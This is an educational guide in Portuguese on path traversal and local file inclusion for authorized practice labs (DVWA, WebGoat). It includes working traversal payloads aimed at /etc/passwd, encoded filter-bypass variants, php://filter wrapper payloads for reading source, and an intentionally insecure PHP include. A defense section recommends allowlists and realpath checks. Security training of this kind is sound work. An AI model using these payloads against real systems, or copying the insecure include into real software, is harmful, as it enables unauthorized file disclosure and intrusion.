# Path Traversal / LFI (e nocao de RFI)

> Leitura de arquivos e inclusao local via parametros de path — guia educacional para labs (`docker-lab`, DVWA, WebGoat).
> **MITRE ATT&CK: T1190** — Exploit Public-Facing Application. Relacionado a CWE-22 / CWE-98.

**Credito:** adaptado (MIT) do material HexSec / Leonardo Tamiano — reescrito em portugues, sem links de video.

---

## Etica e escopo

- Pratique **apenas** em DVWA/WebGoat do [`docker-lab`](../docker-lab/README.md) ou alvos com autorizacao explicita.
- Objetivo do lab: provar leitura/inclusao controlada com evidencia minima (ex.: trecho de `/etc/passwd` de container de treino).
- **Nao** ha neste guia um walkthrough de upload de webshell. Upload inseguro e vetor separado — ver [auth-bypass-patterns.md](auth-bypass-patterns.md) e a secao "Manual avancado" do [README](README.md) do modulo.

---

## 1. Conceitos

### 1.1 Path traversal (directory traversal)

A aplicacao concatena input do usuario a um caminho de arquivo sem normalizar/validar. O atacante sobe diretorios com `../` (ou variantes) e le arquivos fora do diretorio esperado.

```text
Pedido:  GET /download?file=../../../../etc/passwd
App:     open("/var/www/files/" + user_input)
Resultado: leitura de /etc/passwd (se permissoes e filtros falharem)
```

### 1.2 LFI — Local File Inclusion

Em stacks que **incluem** o arquivo no runtime (tipico PHP `include`/`require`), o path controlado nao so le o conteudo: pode **executar** codigo se o arquivo incluido for interpretado como script (ex.: logs com payload, sessao, wrappers).

```php
// padrao inseguro (conceitual)
include($_GET['page'] . '.php');
```

### 1.3 RFI — Remote File Inclusion

Variante em que `include` aceita URL remota (`allow_url_include` em PHP legado). Hoje e raro em defaults modernos; entenda o conceito, foque LFI/traversal no lab.

| Tipo | O que acontece | Impacto tipico no lab |
|------|----------------|------------------------|
| Traversal / file disclosure | Leitura arbitraria | `/etc/passwd`, configs, source |
| LFI | Inclusao local + possivel exec | Leitura; em cenarios avancados, RCE via cadeia |
| RFI | Inclusao de recurso remoto | RCE (ambiente legado / mal configurado) |

---

## 2. Superficies comuns

Procure parametros e features:

- `page`, `file`, `path`, `doc`, `template`, `lang`, `include`, `view`, `dir`, `folder`
- Download / export / "ver log" / "preview"
- Temas e i18n (`lang=en` -> `lang=../../`)

Checklist de recon:

- [ ] Mapear params com [enum-web-avancado.md](enum-web-avancado.md) / Burp
- [ ] Observar se a resposta reflete conteudo de arquivo ou erro de include
- [ ] Identificar OS (Linux container vs Windows) pelos paths

---

## 3. Payloads classicos (contexto educacional / lab)

> Use so contra o lab. Ajuste encoding ao filtro do nivel (DVWA Low vs Medium).

### 3.1 Traversal basico

```text
../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
```

### 3.2 Wrappers PHP e bypass de sufixo (lab)

Se a app faz `include("pages/" . $input . ".php")`, wrappers evitam depender do arquivo “certo”:

```text
php://filter/convert.base64-encode/resource=index
php://filter/read=convert.base64-encode/resource=../../../../etc/passwd
# null byte %00 — so PHP antigo (< 5.3.4); conceito historico
# Outros wrappers (data://, expect://, phar://): valide no lab; muitos vem desabilitados
```

```bash
echo 'BASE64_AQUI' | base64 -d   # evidencia limpa no relatorio
```

Paths uteis em container Linux: `/etc/passwd`, `/etc/hosts`, `/var/www/html/config.php`. Windows (conceito): `..\..\..\windows\win.ini`.

### 3.3 Encadeamento (sem webshell guide)

LFI sozinho costuma ser **file read**. Cadeias (log poisoning, session include, upload + include) podem virar RCE — fora do escopo detalhado aqui.

**Upload inseguro** e vetor separado (tipo/path/authZ). Ver [auth-bypass-patterns.md](auth-bypass-patterns.md) e [owasp-top10-2021.md](owasp-top10-2021.md). Nao use este guia como receita de webshell.

---

## 4. Exercicios sugeridos (docker-lab)

### Pre-req

```bash
cd docker-lab && docker compose up -d
# DVWA  -> http://127.0.0.1:8081  (login lab / criar DB se pedido)
# WebGoat -> http://127.0.0.1:8084/WebGoat
```

### Exercicio A — DVWA File Inclusion (se modulo existir)

1. Login no DVWA; Security **Low**.
2. Abra **File Inclusion** (ou equivalente na versao da imagem).
3. Troque o parametro `page` (ou similar) por `../../../etc/passwd`.
4. Confirme leitura; capture screenshot redactado.
5. Suba para **Medium**: teste `..%2f` / `....//` e anote o que o filtro bloqueia.
6. Teste `php://filter/convert.base64-encode/resource=...` se a stack for PHP e o nivel permitir.

### Exercicio B — WebGoat Path Traversal / LFI

1. Acesse WebGoat; crie usuario de lab.
2. Complete a licao de **Path Traversal** / **Local File Inclusion** do curriculum atual.
3. Documente: parametro, payload minimo, prova (trecho), filtro observado.

### Exercicio C — Relatorio

No [REPORT-TEMPLATE.md](../REPORT-TEMPLATE.md): titulo (parametro), severidade Alta tipica, passos, evidencia minima (3–5 linhas ou base64), causa (path/include sem allowlist), remediacao, MITRE T1190. Sem modulo LFI na imagem DVWA → use WebGoat.

| Alvo | URL |
|------|-----|
| DVWA | http://127.0.0.1:8081 |
| WebGoat | http://127.0.0.1:8084/WebGoat |

---

## 5. Defesa

1. **Nao** montar path a partir de input livre — use **allowlist** (`home|about` → path fixo).
2. Apos resolver (`realpath`), exija prefixo sob o diretorio base.
3. Desabilite `allow_url_include` / wrappers desnecessarios; rode sem root.
4. Controles extras: `open_basedir`, UUID em vez de filename, sem stack trace ao cliente, WAF como defesa em profundidade.

**Inseguro:** `include($_GET['page'] . '.php');`

**Mais seguro:**

```php
$allowed = [
  'home' => __DIR__ . '/pages/home.php',
  'about' => __DIR__ . '/pages/about.php',
];
$key = $_GET['page'] ?? 'home';
if (!isset($allowed[$key])) { http_response_code(400); exit; }
include $allowed[$key];
```

Download: `Path.resolve()` + checagem de prefixo sob `BASE` (mesmo principio em Python/`pathlib`).

---

## 6. Checklist rapido

- [ ] Parametro de arquivo/pagina identificado; classificar disclosure vs LFI vs RFI
- [ ] Payload minimo + encodings (`%2f`, `....//`) se houver filtro
- [ ] Wrapper `php://filter` para source (PHP); sem webshell neste exercicio
- [ ] Documentar allowlist; `docker compose down` ao encerrar

---

## Referencias

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22](https://cwe.mitre.org/data/definitions/22.html) / [CWE-98](https://cwe.mitre.org/data/definitions/98.html)
- [MITRE ATT&CK T1190](https://attack.mitre.org/techniques/T1190/)
- [enum-web-avancado.md](enum-web-avancado.md) · [docker-lab/README.md](../docker-lab/README.md)
